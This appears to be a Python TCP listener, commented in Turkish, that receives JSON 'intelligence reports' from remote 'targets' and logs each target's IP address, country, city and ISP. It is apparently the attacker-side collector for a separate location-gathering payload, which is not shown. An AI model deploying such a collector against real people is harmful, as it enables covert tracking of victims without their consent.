import socket
import json
import configparser
import os
import logging
import sys

# --- LOG SİSTEMİ KURULUMU ---
logger = logging.getLogger("SiberServer")
logger.setLevel(logging.DEBUG)
log_formati = logging.Formatter('%(asctime)s | [%(levelname)s] | [%(name)s] | %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Log dosyası tek bir "system.log" olarak belirlendi
dosya_handler = logging.FileHandler('system.log', encoding='utf-8')
dosya_handler.setFormatter(log_formati)
konsol_handler = logging.StreamHandler(sys.stdout)
konsol_handler.setFormatter(log_formati)

logger.addHandler(dosya_handler)
logger.addHandler(konsol_handler)
# ----------------------------

# .ini dosyasından ayarları yükle
config = configparser.ConfigParser()
config_path = os.path.join(os.path.dirname(__file__), 'config.ini')
config.read(config_path)

BIND_IP = "0.0.0.0"
BIND_PORT = config.getint('SiberConfig', 'server_port', fallback=9999)

def start_siber_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((BIND_IP, BIND_PORT))
        server.listen(10000)
        logger.info(f"Siber Merkez Dinlemede... (Port: {BIND_PORT})")
        
        while True:
            client_sock, addr = server.accept()
            logger.info(f"Hedef bağlantısı yakalandi! Kaynak: {addr[0]}:{addr[1]}")
            
            request = client_sock.recv(4096).decode('utf-8')
            if request:
                try:
                    data = json.loads(request)
                    if data.get("status") == "SUCCESS":
                        logger.info(f"[İSTİHBARAT RAPORU] İp: {data['ip']} | Ülke: {data['ulke']} | Şehir: {data['sehir']} | ISP: {data['isp']}")
                    else:
                        logger.warning(f"Hedef bilgi toplayamadı. Hata: {data.get('message')}")
                except Exception as json_err:
                    logger.error(f"Veri çözülemedi (JSON Hatası): {json_err}")
                    
            client_sock.close()
            
    except KeyboardInterrupt:
        logger.warning("Sunucu kullanıcı tarafından kapatılıyor (Ctrl+C)...")
    except Exception as e:
        logger.critical(f"Sunucu çalışma zamanı hatası: {e}", exc_info=True)
    finally:
        server.close()
        logger.info("Sunucu tamamen kapatıldı.")

if __name__ == "__main__":
    start_siber_server()